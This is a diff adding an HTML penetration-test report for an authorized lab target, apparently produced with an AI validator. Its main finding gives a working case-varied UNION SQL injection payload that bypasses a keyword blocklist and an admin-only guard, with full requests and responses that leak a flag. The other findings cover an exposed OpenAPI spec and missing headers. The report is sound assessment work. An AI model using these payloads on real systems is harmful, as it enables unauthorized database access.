@@ -1,0 +1,413 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqxd0rp1-wqiar6</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [sqli] Unauthenticated UNION-based SQL injection in POST /jobs (job_type) bypasses admin-only guard, leaks private records</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Swagger UI and OpenAPI spec publicly accessible without authentication</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] OpenAPI JSON spec publicly accessible, exposes full API surface and no security schemes</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#5f7d8c">INFO</span> [headers] Missing security response headers on /docs (no CSP, X-Frame-Options, HSTS)</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] OpenAPI definition found (active scan check)</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] DOM data manipulation (DOM-based)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqxd0rp1-wqiar6</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:8000/</code></td></tr>
+<tr><td>Started</td><td>2026-06-28T05:40:05.778Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>3 mapped · 3 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>6</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:8000</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>6 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#c9a227">2</b> low</span><span><b style="color:#5f7d8c">3</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [sqli] Unauthenticated UNION-based SQL injection in POST /jobs (job_type) bypasses admin-only guard, leaks private records</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8000/</div>
+<div class="desc">The `job_type` field of the JSON body sent to POST /jobs is concatenated directly into a SQL query (SQLite): SELECT id,name,type,description FROM jobs WHERE type = '&lt;job_type&gt;'. A lone single quote returns HTTP 500 (broken syntax), proving string concatenation. The endpoint is fully unauthenticated.
+
+The app layers two weak protections, both bypassable:
+1. A business-logic access-control guard: requesting job_type=&quot;private&quot; returns 403 &quot;Only admins can see private jobs&quot;, and any query whose result set contains the private row (id 3) returns 500 (a post-query guard that throws on private-typed rows).
+2. A naive, CASE-SENSITIVE SQL keyword blocklist: uppercase OR/AND/UNION/ORDER cause 500, but mixed-case variants (oR, UnIoN, SeLeCt, FrOm, WhErE) pass straight through. Confirmed: `back-end' oR 1=2-- ` returns only the back-end row (the OR is genuinely evaluated), and `back-end' oRdEr bY 4-- `=200 while `bY 5-- `=500 reveals a 4-column table.
+
+Chaining these: a case-varied UNION SELECT that masks the type (and id) columns defeats both the keyword filter AND the private-row guard, exfiltrating the protected admin-only job record. Payload: job_type = `nonexistent' UnIoN SeLeCt 999,name,'back-end',description FrOm jobs WhErE id=3-- ` returns the hidden record {name:&quot;Hidden job&quot;, description:&quot;flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}&quot;}. The same primitive allows extraction of arbitrary data from any table in the database.
+
+Impact: unauthenticated attacker reads arbitrary database contents and bypasses the application's only authorization control. Direct sensitive-data exposure (the protected record / secret).</div>
+<div><b>Reproduction</b></div><pre>1. Baseline (guard active): POST /jobs {&quot;job_type&quot;:&quot;private&quot;} -&gt; 403 &quot;Only admins can see private jobs&quot; (ev-mqxdjpac-1j). The private record is not accessible legitimately.
+2. Confirm concatenation: POST /jobs {&quot;job_type&quot;:&quot;'&quot;} -&gt; 500 (syntax break); {&quot;job_type&quot;:&quot;back-end' -- &quot;} -&gt; 200 returning only id 2 (the trailing quote is commented out = injection structurally sound).
+3. Confirm filter is case-sensitive: {&quot;job_type&quot;:&quot;back-end' oR 1=2-- &quot;} -&gt; 200 (id 2 only); {&quot;job_type&quot;:&quot;back-end' oRdEr bY 4-- &quot;} -&gt; 200, {&quot;...bY 5-- &quot;} -&gt; 500 (4 columns).
+4. Exploit (bug present): POST /jobs {&quot;job_type&quot;:&quot;nonexistent' UnIoN SeLeCt 999,name,'back-end',description FrOm jobs WhErE id=3-- &quot;} -&gt; 200 returning {&quot;id&quot;:999,&quot;name&quot;:&quot;Hidden job&quot;,&quot;description&quot;:&quot;flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}&quot;}. Reproduced identically on replay (ev-mqxdqalb-26, ev-mqxdqs6r-27, ev-mqxdqt38-28).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdjpac-1j</code> — <code>artifacts/_/ev-mqxdjpac-1j/</code></div><div class="lbl">REQUEST</div><pre>POST /jobs HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;job_type&quot;:&quot;private&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+content-length: 46
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 05:54:48 GMT
+server: uvicorn
+
+{&quot;detail&quot;: &quot;Only admins can see private jobs&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdqalb-26</code> — <code>artifacts/_/ev-mqxdqalb-26/</code></div><div class="lbl">REQUEST</div><pre>POST /jobs HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;job_type&quot;:&quot;nonexistent' UnIoN SeLeCt 999,name,'back-end',description FrOm jobs WhErE id=3-- &quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 109
+content-type: application/json
+date: Sun, 28 Jun 2026 05:59:56 GMT
+server: uvicorn
+
+[{&quot;id&quot;:999,&quot;name&quot;:&quot;Hidden job&quot;,&quot;type&quot;:&quot;back-end&quot;,&quot;description&quot;:&quot;flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}&quot;}]</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdqs6r-27</code> — <code>artifacts/_/ev-mqxdqs6r-27/</code></div><div class="lbl">REQUEST</div><pre>POST /jobs HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;job_type&quot;:&quot;nonexistent' UnIoN SeLeCt 999,name,'back-end',description FrOm jobs WhErE id=3-- &quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 109
+content-type: application/json
+date: Sun, 28 Jun 2026 06:00:18 GMT
+server: uvicorn
+
+[{&quot;id&quot;:999,&quot;name&quot;:&quot;Hidden job&quot;,&quot;type&quot;:&quot;back-end&quot;,&quot;description&quot;:&quot;flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}&quot;}]</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdqt38-28</code> — <code>artifacts/_/ev-mqxdqt38-28/</code></div><div class="lbl">REQUEST</div><pre>POST /jobs HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;job_type&quot;:&quot;nonexistent' UnIoN SeLeCt 999,name,'back-end',description FrOm jobs WhErE id=3-- &quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 109
+content-type: application/json
+date: Sun, 28 Jun 2026 06:00:19 GMT
+server: uvicorn
+
+[{&quot;id&quot;:999,&quot;name&quot;:&quot;Hidden job&quot;,&quot;type&quot;:&quot;back-end&quot;,&quot;description&quot;:&quot;flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}&quot;}]</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 2. [info-disclosure] Swagger UI and OpenAPI spec publicly accessible without authentication</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8000/</div>
+<div class="desc">The FastAPI Swagger UI at /docs and the machine-readable OpenAPI spec at /openapi.json are served to unauthenticated clients with HTTP 200. The spec enumerates all endpoints (/jobs POST, /ping GET, / GET) with no securitySchemes defined, meaning any external party can fully map the API surface without credentials. The /jobs endpoint in particular accepts POST requests with no declared authentication requirement.</div>
+<div><b>Reproduction</b></div><pre>1. Without any credentials or session, send GET http://target.local:8000/openapi.json\n2. Observe HTTP 200 with the complete API specification (endpoints, operations, schemas).\n3. Repeat: response is stable and identical both times.\n4. Negative control: GET /admin returns 404 — shows not every path is open, but /docs and /openapi.json have no access control at all.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdajcd-y</code> — <code>artifacts/s-0002/ev-mqxdajcd-y/</code></div><div class="lbl">REQUEST</div><pre>GET /admin HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 22
+content-type: application/json
+date: Sun, 28 Jun 2026 05:47:40 GMT
+server: uvicorn
+
+{&quot;detail&quot;:&quot;Not Found&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxd9tmf-u</code> — <code>artifacts/s-0002/ev-mqxd9tmf-u/</code></div><div class="lbl">REQUEST</div><pre>GET /openapi.json HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 590
+content-type: application/json
+date: Sun, 28 Jun 2026 05:47:07 GMT
+server: uvicorn
+
+{&quot;openapi&quot;:&quot;3.1.0&quot;,&quot;info&quot;:{&quot;title&quot;:&quot;FastAPI&quot;,&quot;version&quot;:&quot;0.1.0&quot;},&quot;paths&quot;:{&quot;/jobs&quot;:{&quot;post&quot;:{&quot;summary&quot;:&quot;Jobs&quot;,&quot;operationId&quot;:&quot;jobs_jobs_post&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}},&quot;/ping&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Ping&quot;,&quot;operationId&quot;:&quot;ping_ping_get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}},&quot;/&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Read Root&quot;,&quot;operationId&quot;:&quot;read_root__get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}}}}}}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdahyz-w</code> — <code>artifacts/s-0002/ev-mqxdahyz-w/</code></div><div class="lbl">REQUEST</div><pre>GET /openapi.json HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 590
+content-type: application/json
+date: Sun, 28 Jun 2026 05:47:38 GMT
+server: uvicorn
+
+{&quot;openapi&quot;:&quot;3.1.0&quot;,&quot;info&quot;:{&quot;title&quot;:&quot;FastAPI&quot;,&quot;version&quot;:&quot;0.1.0&quot;},&quot;paths&quot;:{&quot;/jobs&quot;:{&quot;post&quot;:{&quot;summary&quot;:&quot;Jobs&quot;,&quot;operationId&quot;:&quot;jobs_jobs_post&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}},&quot;/ping&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Ping&quot;,&quot;operationId&quot;:&quot;ping_ping_get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}},&quot;/&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Read Root&quot;,&quot;operationId&quot;:&quot;read_root__get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}}}}}}}</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 3. [info-disclosure] OpenAPI JSON spec publicly accessible, exposes full API surface and no security schemes</h3>
+<div class="kv">Screen: <code>s-0003</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8000/</div>
+<div class="desc">The machine-readable OpenAPI 3.1 specification is served without any authentication requirement. It discloses: (1) all three API paths — POST /jobs, GET /ping, GET / — including /jobs which is not prominently linked in the UI; (2) zero security scheme definitions, confirming the entire API has no documented authentication layer; (3) the underlying framework and version (FastAPI 0.1.0). Any unauthenticated actor can programmatically enumerate all operations and their schemas. The CORS probe returned no Access-Control-Allow-Origin header, so the JSON cannot be fetched cross-site directly, but the spec is fully readable via direct browser or curl without credentials.</div>
+<div><b>Reproduction</b></div><pre>1. Send GET http://target.local:8000/openapi.json with no session cookie or Authorization header.
+2. Server returns HTTP 200 with the full OpenAPI 3.1 JSON.
+3. Parse paths — /jobs (POST, no security scheme), /ping (GET), / (GET) are all disclosed.
+4. Note absence of any &quot;securitySchemes&quot; or &quot;security&quot; object — confirms no auth layer is defined.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxderup-12</code> — <code>artifacts/s-0003/ev-mqxderup-12/</code></div><div class="lbl">REQUEST</div><pre>GET /openapi.yaml HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 22
+content-type: application/json
+date: Sun, 28 Jun 2026 05:50:58 GMT
+server: uvicorn
+
+{&quot;detail&quot;:&quot;Not Found&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdcu2b-z</code> — <code>artifacts/s-0003/ev-mqxdcu2b-z/</code></div><div class="lbl">REQUEST</div><pre>GET /openapi.json HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 590
+content-type: application/json
+date: Sun, 28 Jun 2026 05:49:27 GMT
+server: uvicorn
+
+{&quot;openapi&quot;:&quot;3.1.0&quot;,&quot;info&quot;:{&quot;title&quot;:&quot;FastAPI&quot;,&quot;version&quot;:&quot;0.1.0&quot;},&quot;paths&quot;:{&quot;/jobs&quot;:{&quot;post&quot;:{&quot;summary&quot;:&quot;Jobs&quot;,&quot;operationId&quot;:&quot;jobs_jobs_post&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}},&quot;/ping&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Ping&quot;,&quot;operationId&quot;:&quot;ping_ping_get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}},&quot;/&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Read Root&quot;,&quot;operationId&quot;:&quot;read_root__get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}}}}}}}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdequ4-11</code> — <code>artifacts/s-0003/ev-mqxdequ4-11/</code></div><div class="lbl">REQUEST</div><pre>GET /openapi.json HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 590
+content-type: application/json
+date: Sun, 28 Jun 2026 05:50:57 GMT
+server: uvicorn
+
+{&quot;openapi&quot;:&quot;3.1.0&quot;,&quot;info&quot;:{&quot;title&quot;:&quot;FastAPI&quot;,&quot;version&quot;:&quot;0.1.0&quot;},&quot;paths&quot;:{&quot;/jobs&quot;:{&quot;post&quot;:{&quot;summary&quot;:&quot;Jobs&quot;,&quot;operationId&quot;:&quot;jobs_jobs_post&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}},&quot;/ping&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Ping&quot;,&quot;operationId&quot;:&quot;ping_ping_get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;application/json&quot;:{&quot;schema&quot;:{}}}}}}},&quot;/&quot;:{&quot;get&quot;:{&quot;summary&quot;:&quot;Read Root&quot;,&quot;operationId&quot;:&quot;read_root__get&quot;,&quot;responses&quot;:{&quot;200&quot;:{&quot;description&quot;:&quot;Successful Response&quot;,&quot;content&quot;:{&quot;text/html&quot;:{&quot;schema&quot;:{&quot;type&quot;:&quot;string&quot;}}}}}}}}}</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 4. [headers] Missing security response headers on /docs (no CSP, X-Frame-Options, HSTS)</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8000/</div>
+<div class="desc">GET /docs returns only a Content-Type header. The following security headers are absent: Content-Security-Policy (XSS/injection control), X-Frame-Options (clickjacking), Strict-Transport-Security (HSTS), and X-Content-Type-Options. The same omission applies to /openapi.json. The Swagger UI loads third-party JS from cdn.jsdelivr.net without a hash or SRI attribute, which CSP would normally restrict.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:8000/docs\n2. Inspect response headers — only Content-Type: text/html; charset=utf-8 is present.\n3. No Content-Security-Policy, X-Frame-Options, Strict-Transport-Security, or X-Content-Type-Options headers appear.\n4. Repeat: consistent across both requests.\n5. Negative control: /admin returns 404 with application/json only — a distinct status/body confirming the /docs responses are the target surface.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdajcd-y</code> — <code>artifacts/s-0002/ev-mqxdajcd-y/</code></div><div class="lbl">REQUEST</div><pre>GET /admin HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 22
+content-type: application/json
+date: Sun, 28 Jun 2026 05:47:40 GMT
+server: uvicorn
+
+{&quot;detail&quot;:&quot;Not Found&quot;}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxd9u1n-v</code> — <code>artifacts/s-0002/ev-mqxd9u1n-v/</code></div><div class="lbl">REQUEST</div><pre>GET /docs HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 931
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 05:47:08 GMT
+server: uvicorn
+
+
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+    &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css&quot;&gt;
+    &lt;link rel=&quot;shortcut icon&quot; href=&quot;https://fastapi.tiangolo.com/img/favicon.png&quot;&gt;
+    &lt;title&gt;FastAPI - Swagger UI&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+    &lt;div id=&quot;swagger-ui&quot;&gt;
+    &lt;/div&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js&quot;&gt;&lt;/script&gt;
+    &lt;!-- `SwaggerUIBundle` is now available on the page --&gt;
+    &lt;script&gt;
+    const ui = SwaggerUIBundle({
+        url: '/openapi.json',
+    &quot;dom_id&quot;: &quot;#swagger-ui&quot;,
+&quot;layout&quot;: &quot;BaseLayout&quot;,
+&quot;deepLinking&quot;: true,
+&quot;showExtensions&quot;: true,
+&quot;showCommonExtensions&quot;: true,
+oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
+    presets: [
+        SwaggerUIBundle.presets.apis,
+        SwaggerUIBundle.SwaggerUIStandalonePreset
+        ],
+    })
+    &lt;/script&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdaite-x</code> — <code>artifacts/s-0002/ev-mqxdaite-x/</code></div><div class="lbl">REQUEST</div><pre>GET /docs HTTP/1.1
+Host: target.local:8000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 931
+content-type: text/html; charset=utf-8
+date: Sun, 28 Jun 2026 05:47:40 GMT
+server: uvicorn
+
+
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;
+    &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css&quot;&gt;
+    &lt;link rel=&quot;shortcut icon&quot; href=&quot;https://fastapi.tiangolo.com/img/favicon.png&quot;&gt;
+    &lt;title&gt;FastAPI - Swagger UI&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+    &lt;div id=&quot;swagger-ui&quot;&gt;
+    &lt;/div&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui-bundle.js&quot;&gt;&lt;/script&gt;
+    &lt;!-- `SwaggerUIBundle` is now available on the page --&gt;
+    &lt;script&gt;
+    const ui = SwaggerUIBundle({
+        url: '/openapi.json',
+    &quot;dom_id&quot;: &quot;#swagger-ui&quot;,
+&quot;layout&quot;: &quot;BaseLayout&quot;,
+&quot;deepLinking&quot;: true,
+&quot;showExtensions&quot;: true,
+&quot;showCommonExtensions&quot;: true,
+oauth2RedirectUrl: window.location.origin + '/docs/oauth2-redirect',
+    presets: [
+        SwaggerUIBundle.presets.apis,
+        SwaggerUIBundle.SwaggerUIStandalonePreset
+        ],
+    })
+    &lt;/script&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 5. [burp] OpenAPI definition found (active scan check)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">(confidence: CERTAIN) @ http://target.local:8000/openapi.json</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxdygya-2f</code> — <code>artifacts/_/ev-mqxdygya-2f/</code></div><div class="lbl">REQUEST</div><pre>GET /openapi.json HTTP/1.1
+Host: target.local:8000
+
+GET /openapi.json HTTP/1.1
+Host: target.local:8000
+Cache-Control: max-age=0
+Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;146&quot;, &quot;Not;A=Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;146&quot;
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+date: Sun, 28 Jun 2026 06:02:26 GMT
+server: uvicorn
+content-length: 590
+content-type: application/json
+connection: close
+
